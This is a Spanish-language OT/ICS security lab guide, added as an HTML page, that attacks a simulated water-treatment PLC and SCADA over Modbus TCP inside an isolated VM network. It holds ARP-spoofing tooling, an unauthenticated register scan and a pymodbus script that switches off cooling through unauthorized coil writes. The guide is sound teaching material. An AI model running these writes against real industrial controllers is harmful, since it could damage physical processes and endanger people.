@@ -1,0 +1,1174 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Guía: Ciberseguridad OT/ICS — Ataques Modbus TCP | CRD</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="assets/css/estilos.css">
+</head>
+<body>
+<main>
+  <div data-include="aviso-etico"></div>
+
+  <h1>🏭 Laboratorio: Ciberseguridad OT/ICS — Ataques Snnifing, MiTM, DoS sobre Sistemas SCADA - PLC  (Red &amp; Blue Team)</h1>
+
+  <p>
+    Este laboratorio demuestra cómo un atacante con acceso a una red OT (Operational Technology)
+    puede comprometer un proceso industrial crítico utilizando técnicas de red estándar —
+    sin exploits, sin vulnerabilidades de software, solo abusando del diseño del protocolo Modbus TCP.
+  </p>
+  <p>
+    El objetivo no es aprender a atacar sistemas industriales como receta. Es entender por qué
+    Modbus TCP es inherentemente inseguro, qué impacto tienen estos ataques en el mundo real,
+    y qué controles defensivos pueden detectarlos o mitigarlos.
+  </p>
+
+  <div style="background-color: #3d1515; padding: 15px; border-left: 5px solid #ff4444; margin-bottom: 20px;">
+    <strong>⚠️ Regla del laboratorio:</strong> Todos los ataques de este laboratorio se ejecutan
+    exclusivamente dentro del entorno virtualizado del curso (VMnet5), contra sistemas propios
+    configurados para este fin. Aplicar estas técnicas contra sistemas industriales reales
+    sin autorización escrita es un delito grave en la mayoría de jurisdicciones y puede
+    causar daño físico, ambiental y humano.
+  </div>
+
+  <hr>
+
+  <h2>📦 Módulos y herramientas requeridas</h2>
+
+  <p>
+    Este laboratorio utiliza herramientas open source que ya vienen instaladas o disponibles
+    en Kali Linux, más algunas librerías Python que deben instalarse manualmente.
+    A continuación se detalla cada módulo, para qué sirve y cómo instalarlo.
+  </p>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>⚠️ Requisito de red para la instalación:</strong> Los pasos de instalación de paquetes
+    requieren que Kali Linux tenga acceso a Internet. Durante esta fase, la VM de Kali debe estar
+    conectada a una red con salida a Internet (modo NAT o Bridged en VMware).
+    Una vez completada la instalación, la interfaz debe reconectarse a <strong>VMnet5</strong>
+    para el laboratorio. Esto se explica en detalle en el Paso de verificación de conectividad.
+  </div>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Herramienta / Módulo</th>
+        <th>¿Qué es?</th>
+        <th>¿Para qué se usa en este lab?</th>
+        <th>¿Ya viene en Kali?</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>arpspoof</strong> (dsniff)</td>
+        <td>Herramienta de envenenamiento ARP</td>
+        <td>Posicionar a Kali como MITM entre PLC y FUXA en Labs 3 y 4</td>
+        <td>Generalmente sí — verificar</td>
+      </tr>
+      <tr>
+        <td><strong>ettercap</strong></td>
+        <td>Suite de ataques MITM</td>
+        <td>ARP spoofing alternativo y captura de tráfico</td>
+        <td>Sí</td>
+      </tr>
+      <tr>
+        <td><strong>wireshark</strong></td>
+        <td>Analizador de protocolos de red</td>
+        <td>Capturar y analizar tráfico Modbus TCP en tiempo real</td>
+        <td>Sí</td>
+      </tr>
+      <tr>
+        <td><strong>python3-pip</strong></td>
+        <td>Gestor de paquetes Python</td>
+        <td>Instalar librerías Python necesarias para los scripts</td>
+        <td>Sí</td>
+      </tr>
+      <tr>
+        <td><strong>pymodbus</strong></td>
+        <td>Librería Python para Modbus TCP</td>
+        <td>Leer y escribir registros del PLC desde los scripts de ataque y monitoreo</td>
+        <td>No — instalar manualmente</td>
+      </tr>
+      <tr>
+        <td><strong>python3-netfilterqueue</strong></td>
+        <td>Librería Python para interceptar paquetes del kernel</td>
+        <td>Capturar y modificar paquetes Modbus en vuelo (Lab 3 — falsificación)</td>
+        <td>No — instalar manualmente</td>
+      </tr>
+      <tr>
+        <td><strong>scapy</strong></td>
+        <td>Librería Python para manipulación de paquetes de red</td>
+        <td>Construir y modificar frames Ethernet/IP/TCP con datos Modbus falsificados</td>
+        <td>Sí (python3-scapy)</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>Instalación completa en Kali (con NAT activo)</h3>
+
+  <p>
+    Con Kali conectada a Internet (NAT), ejecutar los siguientes comandos en orden:
+  </p>
+
+  <pre><code># Paso 1 — Actualizar repositorios
+sudo apt update
+
+# Paso 2 — Instalar herramientas de red (si no están)
+sudo apt install -y dsniff ettercap-text-only wireshark python3-pip python3-scapy
+
+# Paso 3 — Instalar librerías Python con privilegios de sistema
+# (necesario porque los scripts se ejecutan con sudo)
+sudo pip3 install pymodbus --break-system-packages
+sudo pip3 install netfilterqueue --break-system-packages
+
+# Paso 4 — Verificar instalaciones
+arpspoof 2>&1 | head -1
+python3 -c "from pymodbus.client import ModbusTcpClient; print('pymodbus OK')"
+python3 -c "from netfilterqueue import NetfilterQueue; print('netfilterqueue OK')"
+python3 -c "from scapy.all import IP; print('scapy OK')"</code></pre>
+
+  <p>El resultado esperado de las verificaciones:</p>
+  <pre><code>Version 2.x - ...       ← arpspoof presente
+pymodbus OK
+netfilterqueue OK
+scapy OK</code></pre>
+
+  <div style="background-color: #3d1515; padding: 15px; border-left: 5px solid #ff4444; margin-bottom: 20px;">
+    <strong>⚠️ Error común — externally-managed-environment:</strong>
+    Si pip3 devuelve este error, usar el flag <code>--break-system-packages</code>
+    que ya está incluido en los comandos anteriores. Es seguro en este contexto de laboratorio.
+    Si el error persiste, alternativa: <code>sudo apt install python3-pymodbus</code>
+  </div>
+
+  <hr>
+
+  <h2>🖥️ Preparación del entorno — Descarga e importación de las VMs</h2>
+
+  <h3>¿Qué es el PLC y por qué es crítico en la industria?</h3>
+
+  <p>
+    Un <strong>PLC (Programmable Logic Controller)</strong> es un computador industrial
+    diseñado para controlar procesos físicos en tiempo real — motores, válvulas, bombas,
+    sensores de temperatura y presión. A diferencia de un servidor convencional, el PLC
+    ejecuta su programa de forma cíclica con tiempos de respuesta de milisegundos
+    y está diseñado para operar sin interrupciones durante años.
+  </p>
+  <p>
+    En la industria, los PLCs controlan procesos donde un fallo tiene consecuencias físicas directas:
+    una central eléctrica que distribuye energía a miles de hogares, una planta química donde
+    una válvula mal posicionada puede causar una explosión, o una planta de agua potable donde
+    una concentración incorrecta de químicos puede envenenar a toda una ciudad.
+    En este laboratorio, el PLC es una VM con <strong>OpenPLC Runtime</strong> —
+    software open source que implementa el estándar IEC 61131-3 y expone registros
+    vía Modbus TCP, exactamente como un PLC físico industrial.
+  </p>
+
+  <h3>¿Qué es el SCADA/HMI y cuál es su rol?</h3>
+
+  <p>
+    Un <strong>SCADA (Supervisory Control and Data Acquisition)</strong> es el sistema que
+    permite al operador humano supervisar y controlar el proceso industrial desde una interfaz gráfica.
+    Muestra en tiempo real el estado de todos los equipos, registra históricos, genera alarmas
+    cuando los valores salen de rango, y permite enviar comandos al PLC.
+  </p>
+  <p>
+    En una planta real, el SCADA es la única ventana que tiene el operador sobre el proceso.
+    Si el SCADA muestra información falsa, el operador toma decisiones incorrectas.
+    En este laboratorio, el SCADA es una VM con <strong>FUXA</strong> —
+    un HMI web open source que se comunica con el PLC por Modbus TCP
+    y muestra el dashboard de la planta de tratamiento de agua.
+  </p>
+
+  <h3>Paso 1 — Descargar las VMs desde la carpeta compartida del curso</h3>
+
+  <p>
+    Las dos VMs ya están preconfiguradas con todo el software instalado y los programas cargados.
+    Descargar ambos archivos desde la carpeta compartida del curso:
+  </p>
+
+  <ul>
+    <li><strong>VM-PLC-OpenPLC.ova</strong> — VM del controlador PLC</li>
+    <li><strong>VM-SCADA-FUXA.ova</strong> — VM del sistema SCADA/HMI</li>
+  </ul>
+
+  <h3>Paso 2 — Importar las VMs en VMware Workstation</h3>
+
+  <p>Para cada archivo OVA, repetir el siguiente proceso:</p>
+
+  <ol>
+    <li>Abrir <strong>VMware Workstation</strong></li>
+    <li>Ir a <strong>File → Open</strong> (o Ctrl+O)</li>
+    <li>Seleccionar el archivo <code>.ova</code> descargado</li>
+    <li>En la pantalla de importación, hacer click en <strong>Import</strong></li>
+    <li>Esperar a que VMware complete la importación (puede tardar 2-5 minutos)</li>
+    <li>La VM aparecerá en la biblioteca de VMware con el nombre original</li>
+  </ol>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Si VMware muestra advertencia de compatibilidad:</strong>
+    Hacer click en <strong>Retry</strong> o <strong>Continue</strong> — es normal
+    cuando el OVA fue creado en una versión diferente de VMware.
+    La VM funcionará correctamente.
+  </div>
+
+  <h3>Paso 3 — Conectar ambas VMs a VMnet5</h3>
+
+  <p>
+    Las dos VMs deben estar en la misma red interna (VMnet5) para comunicarse entre sí
+    y con Kali. Para cada VM importada:
+  </p>
+
+  <ol>
+    <li>Click derecho sobre la VM → <strong>Settings</strong></li>
+    <li>Seleccionar <strong>Network Adapter</strong></li>
+    <li>En <strong>Network connection</strong>, seleccionar <strong>Custom: Specific virtual network</strong></li>
+    <li>En el dropdown, seleccionar <strong>VMnet5</strong></li>
+    <li>Click <strong>OK</strong></li>
+  </ol>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 ¿Qué es VMnet5?</strong>
+    VMnet5 es una red virtual interna de VMware — un switch virtual que solo existe
+    dentro del host. Las VMs conectadas a VMnet5 se ven entre sí pero no tienen
+    acceso a Internet ni a la red física del host. Simula una red OT aislada,
+    que es exactamente el diseño de red que deberían tener los sistemas industriales reales.
+  </div>
+
+  <hr>
+
+  <h2>🔌 Verificaciones previas antes del laboratorio</h2>
+
+  <h3>Paso 1 — Reconectar Kali a VMnet5</h3>
+
+  <p>
+    Una vez completadas todas las instalaciones de paquetes (que requirieron NAT/Internet),
+    reconectar la interfaz de red de Kali a VMnet5:
+  </p>
+
+  <ol>
+    <li>En VMware, click derecho sobre la VM de Kali → <strong>Settings</strong></li>
+    <li>Seleccionar <strong>Network Adapter</strong></li>
+    <li>Cambiar a <strong>Custom: VMnet5</strong></li>
+    <li>Click <strong>OK</strong></li>
+    <li>En Kali, verificar que la interfaz tiene una IP en el rango <code>192.168.55.x</code>:</li>
+  </ol>
+
+  <pre><code>ip addr show eth1
+# Debe mostrar: inet 192.168.55.130/24</code></pre>
+
+  <h3>Paso 2 — Verificar que las VMs de PLC y SCADA están corriendo</h3>
+
+  <p>
+    Arrancar ambas VMs si no están encendidas. Esperar 30-60 segundos a que los servicios
+    inicien automáticamente. Luego verificar acceso desde el navegador del host:
+  </p>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>VM</th>
+        <th>URL de verificación</th>
+        <th>Lo que debe aparecer</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>PLC — OpenPLC</td>
+        <td><code>http://192.168.55.48:8080</code></td>
+        <td>Panel de login de OpenPLC (usuario: openplc / contraseña: openplc)</td>
+      </tr>
+      <tr>
+        <td>SCADA — FUXA</td>
+        <td><code>http://192.168.55.124:1881/lab</code></td>
+        <td>Dashboard de la planta de tratamiento de agua</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>Paso 3 — Verificar conectividad de red completa desde Kali</h3>
+
+  <pre><code># Verificar conectividad con el PLC
+ping -c 3 192.168.55.48
+# Resultado esperado: 3 paquetes transmitidos, 3 recibidos, 0% pérdida
+
+# Verificar conectividad con el SCADA
+ping -c 3 192.168.55.124
+# Resultado esperado: 3 paquetes transmitidos, 3 recibidos, 0% pérdida
+
+# Verificar que el puerto Modbus del PLC está accesible
+python3 -c "
+from pymodbus.client import ModbusTcpClient
+c = ModbusTcpClient('192.168.55.48', port=502)
+if c.connect():
+    print('Puerto 502 Modbus TCP: ACCESIBLE')
+    c.close()
+else:
+    print('ERROR: No se puede conectar al puerto 502')
+"</code></pre>
+
+  <p>También verificar desde el PLC hacia el SCADA y viceversa:</p>
+
+  <pre><code># Desde la VM del PLC (conectarse por SSH o consola)
+ssh plc@192.168.55.48
+ping -c 3 192.168.55.124   # PLC → FUXA
+ping -c 3 192.168.55.130   # PLC → Kali
+
+# Desde la VM del SCADA
+ssh plc@192.168.55.124
+ping -c 3 192.168.55.48    # FUXA → PLC
+ping -c 3 192.168.55.130   # FUXA → Kali</code></pre>
+
+  <div style="background-color: #3d1515; padding: 15px; border-left: 5px solid #ff4444; margin-bottom: 20px;">
+    <strong>⚠️ Si el ping falla:</strong> Verificar que las tres VMs están conectadas a VMnet5
+    (no a NAT ni a Bridged). Verificar que las VMs están encendidas y que los servicios
+    arrancaron correctamente. Si el puerto 502 no responde, verificar que el PLC está
+    en estado <strong>Running</strong> desde el panel web de OpenPLC.
+  </div>
+
+  <hr>
+
+  <h2>▶️ Inicio del proceso — Activar el SCADA</h2>
+
+  <p>
+    Una vez que la conectividad está verificada, el siguiente paso es activar el proceso
+    en el SCADA para que el laboratorio esté en estado operacional antes de ejecutar los ataques.
+  </p>
+
+  <h3>Paso 1 — Verificar que el PLC está en Running</h3>
+
+  <p>
+    Acceder al panel de OpenPLC desde el navegador:
+    <code>http://192.168.55.48:8080</code>
+  </p>
+  <ol>
+    <li>Login con usuario <strong>openplc</strong> y contraseña <strong>openplc</strong></li>
+    <li>En el Dashboard verificar que el estado dice <strong style="color: green;">Running: Planta de Agua</strong></li>
+    <li>Si dice <strong style="color: red;">Stopped</strong>, hacer click en <strong>Start PLC</strong></li>
+  </ol>
+
+  <h3>Paso 2 — Activar el proceso desde el SCADA FUXA</h3>
+
+  <p>
+    Acceder al dashboard del SCADA: <code>http://192.168.55.124:1881/lab</code>
+  </p>
+  <p>
+    El dashboard mostrará la planta con la bomba y el ventilador apagados al inicio.
+    Para activar el proceso, hacer click en los dos botones en este orden:
+  </p>
+
+  <ol>
+    <li>
+      Hacer click en el botón <strong>"Ventilador"</strong> (Radiador) —
+      el icono del ventilador debería comenzar a girar y el indicador cambiar a verde
+    </li>
+    <li>
+      Hacer click en el botón <strong>"Iniciar Bomba"</strong> —
+      el indicador de la bomba debería cambiar a verde
+    </li>
+  </ol>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Verificación de funcionamiento correcto:</strong>
+    Si todo está bien, después de activar ambos equipos se observará lo siguiente en el dashboard:
+    <ul style="margin-top: 10px;">
+      <li>El <strong>nivel del tanque</strong> comenzará a subir progresivamente (de ~5% hacia 90%)</li>
+      <li>La <strong>temperatura</strong> comenzará a bajar (desde ~98°C hacia 20°C)</li>
+      <li>El <strong>ventilador</strong> mostrará estado ON con el icono girando</li>
+      <li>La <strong>bomba</strong> mostrará estado ON</li>
+      <li>Las alarmas deberían apagarse a medida que la temperatura baja de 85°C y 60°C</li>
+    </ul>
+    Este es el estado <strong>normal de operación</strong> desde el cual se iniciarán todos los ataques del laboratorio.
+  </div>
+
+  <div style="background-color: #3d1515; padding: 15px; border-left: 5px solid #ff4444; margin-bottom: 20px;">
+    <strong>⚠️ Si el tanque no sube o la temperatura no baja:</strong>
+    Verificar que el PLC está en estado Running. Verificar en el monitor de OpenPLC
+    (<strong>Monitoring</strong> en el menú lateral) que los valores de <code>bomba_on</code>
+    y <code>ventilador_on</code> muestran <code>TRUE</code>.
+    Si muestran <code>0</code>, el comando del SCADA no llegó al PLC —
+    verificar la conectividad de red entre las dos VMs.
+  </div>
+
+  <hr>
+
+  <h2>🗺️ Mapeo de Técnicas MITRE ATT&CK for ICS</h2>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Táctica</th>
+        <th>Técnica</th>
+        <th>Código MITRE ICS</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Reconocimiento</strong></td>
+        <td>Remote System Information Discovery</td>
+        <td><code>T0888</code></td>
+      </tr>
+      <tr>
+        <td><strong>Ejecución</strong></td>
+        <td>Command-Line Interface</td>
+        <td><code>T0807</code></td>
+      </tr>
+      <tr>
+        <td><strong>Manipulación de proceso</strong></td>
+        <td>Unauthorized Command Message</td>
+        <td><code>T0855</code></td>
+      </tr>
+      <tr>
+        <td><strong>Evasión</strong></td>
+        <td>Spoof Reporting Message</td>
+        <td><code>T0856</code></td>
+      </tr>
+      <tr>
+        <td><strong>Impacto</strong></td>
+        <td>Loss of View / Denial of Control</td>
+        <td><code>T0829 / T0813</code></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <h2>🏗️ Arquitectura del Laboratorio</h2>
+
+  <div style="text-align: center; margin-bottom: 20px;">
+    <img src="assets/img/labscada.png" alt="Diagrama de arquitectura del laboratorio SCADA OT/ICS — tres VMs en VMnet5: PLC OpenPLC, SCADA FUXA y Kali atacante" style="max-width: 100%; border: 1px solid #444; border-radius: 6px;">
+    <p style="font-size: 0.85em; color: #888; margin-top: 6px;">Diagrama de red del laboratorio — tres VMs en VMnet5 simulando una red OT flat sin segmentación</p>
+  </div>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Componente</th>
+        <th>IP</th>
+        <th>Puerto</th>
+        <th>Rol</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>OpenPLC Runtime v3</strong></td>
+        <td><code>192.168.55.48</code></td>
+        <td><code>:8080 / :502</code></td>
+        <td>PLC software — simula una planta de tratamiento de agua con bomba, ventilador y sensores</td>
+      </tr>
+      <tr>
+        <td><strong>FUXA SCADA/HMI</strong></td>
+        <td><code>192.168.55.124</code></td>
+        <td><code>:1881</code></td>
+        <td>Sistema de supervisión — panel del operador con dashboard en tiempo real</td>
+      </tr>
+      <tr>
+        <td><strong>Kali Linux</strong></td>
+        <td><code>192.168.55.130</code></td>
+        <td>—</td>
+        <td>Atacante — ya tiene acceso a la red OT (escenario post-movimiento lateral)</td>
+      </tr>
+      <tr>
+        <td><strong>Red</strong></td>
+        <td><code>192.168.55.0/24</code></td>
+        <td>—</td>
+        <td>VMnet5 — red interna aislada simulando una red OT flat sin segmentación</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>🔧 Proceso Simulado — Planta de Tratamiento de Agua</h2>
+
+  <p>
+    El PLC ejecuta un programa en lenguaje Structured Text (IEC 61131-3) que simula
+    el sistema de refrigeración de una bomba industrial:
+  </p>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Estado</th>
+        <th>Bomba</th>
+        <th>Ventilador</th>
+        <th>Efecto</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>✅ Normal</td>
+        <td>ON</td>
+        <td>ON</td>
+        <td>Temperatura baja, nivel de tanque sube</td>
+      </tr>
+      <tr>
+        <td>⚠️ Alerta</td>
+        <td>ON</td>
+        <td>OFF</td>
+        <td>Temperatura +3°C por ciclo, nivel sube</td>
+      </tr>
+      <tr>
+        <td>⚠️ Alerta</td>
+        <td>OFF</td>
+        <td>ON</td>
+        <td>Temperatura +1°C por ciclo, nivel baja</td>
+      </tr>
+      <tr>
+        <td>🔴 Crítico</td>
+        <td>OFF</td>
+        <td>OFF</td>
+        <td>Temperatura +5°C por ciclo, nivel baja rápido, alarma explosión a 85°C</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>📋 Scripts del laboratorio</h2>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Script</th>
+        <th>Uso</th>
+        <th>Requiere sudo</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>1_arp_spoof.sh</code></td>
+        <td>ARP Spoofing — base para todos los ataques MITM</td>
+        <td>Sí</td>
+      </tr>
+      <tr>
+        <td><code>2_monitor.py</code></td>
+        <td>Monitor Modbus en tiempo real — muestra estado real del PLC</td>
+        <td>No</td>
+      </tr>
+      <tr>
+        <td><code>3_ataque.py</code></td>
+        <td>Menú de ataques con inyección y falsificación</td>
+        <td>Sí (opción 2)</td>
+      </tr>
+      <tr>
+        <td><code>ataque_flood.py</code></td>
+        <td>Flooding y saturación de registros Modbus</td>
+        <td>No</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>📌 Nota:</strong> La detección de estos ataques mediante IDS se practica en el
+    laboratorio dedicado de Snort, donde se conecta una VM IDS a VMnet5 y se analizan
+    las alertas generadas en tiempo real sobre el tráfico Modbus TCP.
+  </div>
+
+  <hr>
+
+  <h2>🧹 PASO 0 — Limpieza general</h2>
+  <h3>Ejecutar SIEMPRE antes de comenzar cada laboratorio</h3>
+
+  <p>
+    Antes de cada lab es fundamental partir de un estado limpio — sin procesos residuales,
+    sin reglas iptables anteriores y con el PLC en estado normal. Un estado sucio es la causa
+    más común de comportamiento inesperado durante los ejercicios.
+  </p>
+
+  <pre><code># En Kali — matar todos los procesos anteriores del lab
+sudo pkill -f arpspoof 2>/dev/null
+sudo pkill -f ataque 2>/dev/null
+sudo pkill -f flood 2>/dev/null
+sudo pkill -f monitor 2>/dev/null
+sudo pkill -f nfqueue 2>/dev/null
+
+# Limpiar reglas iptables
+sudo iptables -F FORWARD
+sudo iptables -t nat -F PREROUTING
+sudo iptables -P FORWARD ACCEPT
+
+# Activar IP forwarding (necesario para Labs 2 en adelante)
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+# Restaurar PLC a estado normal
+python3 -c "
+from pymodbus.client import ModbusTcpClient
+c = ModbusTcpClient('192.168.55.48', port=502)
+c.connect()
+c.write_coil(address=0, value=True)
+c.write_coil(address=1, value=True)
+c.write_register(address=1024, value=38)
+c.write_register(address=1025, value=62)
+print('PLC restaurado — Bomba ON | Ventilador ON | Temp 38C | Nivel 62%')
+c.close()
+"</code></pre>
+
+  <p>Verificar en FUXA que el dashboard muestra:</p>
+  <ul>
+    <li>Bomba ON ✅</li>
+    <li>Ventilador ON ✅</li>
+    <li>Temperatura bajando hacia 20°C</li>
+    <li>Nivel de tanque subiendo hacia 90%</li>
+  </ul>
+
+  <hr>
+
+  <h2>🔴 LAB 1 — Reconocimiento Modbus</h2>
+  <h3>Objetivo: descubrir todos los registros del PLC sin credenciales</h3>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Concepto clave:</strong> Modbus TCP no tiene autenticación. Cualquier dispositivo
+    que llegue al puerto 502 puede leer y escribir todos los registros del PLC.
+    No se necesitan credenciales, no hay handshake de seguridad, no hay cifrado.
+    Fue diseñado en 1979 para redes aisladas — hoy se usa en redes conectadas a Internet.
+  </div>
+
+  <h3>Ejemplo real — Shodan y SCADA expuestos</h3>
+  <p>
+    En 2021 en Oldsmar, Florida, un atacante accedió remotamente al sistema SCADA de
+    una planta de agua potable y aumentó el nivel de hidróxido de sodio de 111 ppm a 11.100 ppm
+    — 100 veces el nivel seguro — usando exactamente las mismas funciones Modbus
+    que vamos a explorar en este laboratorio. El operador lo vio en el HMI y lo revirtió,
+    pero si no hubiera estado mirando, el agua contaminada habría llegado a 15.000 personas.
+  </p>
+
+  <h3>Paso 1 — Verificar conectividad</h3>
+  <pre><code># Desde Kali — verificar que el PLC está accesible
+ping 192.168.55.48
+ping 192.168.55.124</code></pre>
+
+  <h3>Paso 2 — Escanear los registros Modbus del PLC</h3>
+  <p>
+    El siguiente script lee todos los coils (outputs digitales) y holding registers
+    (valores analógicos) disponibles en el PLC, sin credenciales ni configuración previa:
+  </p>
+
+  <pre><code>python3 -c "
+from pymodbus.client import ModbusTcpClient
+
+print('=== RECONOCIMIENTO MODBUS SIN CREDENCIALES ===')
+print('Conectando a 192.168.55.48:502...')
+
+c = ModbusTcpClient('192.168.55.48', port=502)
+c.connect()
+
+print('Escaneando coils (outputs digitales)...')
+r = c.read_coils(address=0, count=8)
+for i, v in enumerate(r.bits[:8]):
+    print(f'  Coil {i}: {v}')
+
+print('')
+print('Escaneando holding registers con valor != 0...')
+for bloque in range(0, 1200, 100):
+    try:
+        r2 = c.read_holding_registers(address=bloque, count=100)
+        for i, v in enumerate(r2.registers):
+            if v != 0:
+                print(f'  HR address={bloque+i} offset={bloque+i+1}: {v}')
+    except:
+        break
+
+c.close()
+print('Reconocimiento completado.')
+"</code></pre>
+
+  <p>Resultado esperado:</p>
+  <pre><code>=== RECONOCIMIENTO MODBUS SIN CREDENCIALES ===
+Conectando a 192.168.55.48:502...
+Escaneando coils (outputs digitales)...
+  Coil 0: True    ← bomba_on
+  Coil 1: True    ← ventilador_on
+  Coil 2: False
+  ...
+
+Escaneando holding registers con valor != 0...
+  HR address=1024 offset=1025: 38   ← temperatura en °C
+  HR address=1025 offset=1026: 62   ← nivel del tanque en %</code></pre>
+
+  <h3>Mapa de registros descubiertos</h3>
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Variable</th>
+        <th>Tipo</th>
+        <th>Address</th>
+        <th>Offset FUXA</th>
+        <th>Descripción</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>bomba_on</code></td>
+        <td>Coil (Bool)</td>
+        <td>0</td>
+        <td>1</td>
+        <td>Estado de la bomba principal</td>
+      </tr>
+      <tr>
+        <td><code>ventilador_on</code></td>
+        <td>Coil (Bool)</td>
+        <td>1</td>
+        <td>2</td>
+        <td>Estado del ventilador de refrigeración</td>
+      </tr>
+      <tr>
+        <td><code>temperatura</code></td>
+        <td>Holding Register (Int)</td>
+        <td>1024</td>
+        <td>1025</td>
+        <td>Temperatura del proceso en °C</td>
+      </tr>
+      <tr>
+        <td><code>nivel_tanque</code></td>
+        <td>Holding Register (Int)</td>
+        <td>1025</td>
+        <td>1026</td>
+        <td>Nivel del tanque en porcentaje</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div style="background-color: #3d1515; padding: 15px; border-left: 5px solid #ff4444; margin-bottom: 20px;">
+    <strong>⚠️ Impacto real:</strong> Con esta información un atacante sabe exactamente
+    qué registros controlan el proceso. No necesitó documentación, no necesitó credenciales,
+    no dejó rastro en ningún log de autenticación porque Modbus TCP no tiene autenticación.
+    En una red OT real, esta fase de reconocimiento es completamente silenciosa.
+  </div>
+
+  <hr>
+
+  <h2>🔴 LAB 2 — Inyección Modbus directa</h2>
+  <h3>Objetivo: modificar el proceso industrial enviando comandos no autorizados al PLC</h3>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Concepto clave:</strong> Modbus FC05 (Write Single Coil) y FC06 (Write Single Register)
+    permiten escribir directamente en los registros del PLC desde cualquier dispositivo de la red.
+    No hay firma digital, no hay autorización por rol, no hay log de quién escribió qué.
+  </div>
+
+  <h3>Ejemplo real — Triton/TRISIS (Arabia Saudita, 2017)</h3>
+  <p>
+    El malware Triton atacó los Safety Instrumented Systems (SIS) de una planta petroquímica.
+    Reprogramó los controladores de seguridad para deshabilitar las paradas de emergencia,
+    dejando la planta físicamente sin protección. El objetivo era causar una explosión.
+    El ataque fue detectado por accidente cuando un controlador falló y la planta entró
+    en parada de emergencia automática — exactamente lo que el atacante quería desactivar.
+  </p>
+
+  <h3>Paso 1 — Abrir el monitor en una terminal (recomendado)</h3>
+  <pre><code># Terminal 1 — ver el efecto en tiempo real
+python3 2_monitor.py</code></pre>
+
+  <h3>Paso 2 — Ejecutar el ataque de inyección directa</h3>
+  <pre><code># Terminal 2 — menú de ataques
+python3 3_ataque.py</code></pre>
+  <p>Elegir opción <strong>1 — Ataque directo</strong></p>
+
+  <h3>Equivalente manual del ataque</h3>
+  <pre><code># Apagar el ventilador — FC05 Write Single Coil
+python3 -c "
+from pymodbus.client import ModbusTcpClient
+import time
+
+c = ModbusTcpClient('192.168.55.48', port=502)
+c.connect()
+
+# Leer estado antes del ataque
+r = c.read_coils(address=0, count=2)
+r2 = c.read_holding_registers(address=1024, count=1)
+print(f'ANTES: Bomba={r.bits[0]} | Ventilador={r.bits[1]} | Temp={r2.registers[0]}C')
+
+# Apagar el ventilador — FC05
+c.write_coil(address=1, value=False)
+print('FC05 enviado — ventilador apagado')
+
+time.sleep(5)
+
+# Verificar efecto
+r = c.read_coils(address=0, count=2)
+r2 = c.read_holding_registers(address=1024, count=1)
+print(f'DESPUES: Bomba={r.bits[0]} | Ventilador={r.bits[1]} | Temp={r2.registers[0]}C')
+
+c.close()
+"</code></pre>
+
+  <h3>Lo que ocurre paso a paso</h3>
+  <ol>
+    <li>Kali envía un paquete TCP al puerto 502 del PLC con función FC05 (Write Single Coil)</li>
+    <li>El PLC acepta el comando sin validación — apaga el ventilador</li>
+    <li>FUXA detecta el cambio porque lee el estado real del PLC cada 500ms</li>
+    <li>El operador ve el ventilador apagarse en el dashboard</li>
+    <li>La temperatura empieza a subir +3°C por ciclo</li>
+    <li>A 60°C → alarma amarilla en FUXA</li>
+    <li>A 85°C → alarma roja, indicador de riesgo de explosión</li>
+  </ol>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Observación:</strong> El operador ve el cambio en FUXA pero no sabe que fue
+    causado externamente. Sin logs de escritura Modbus, sin alertas de red,
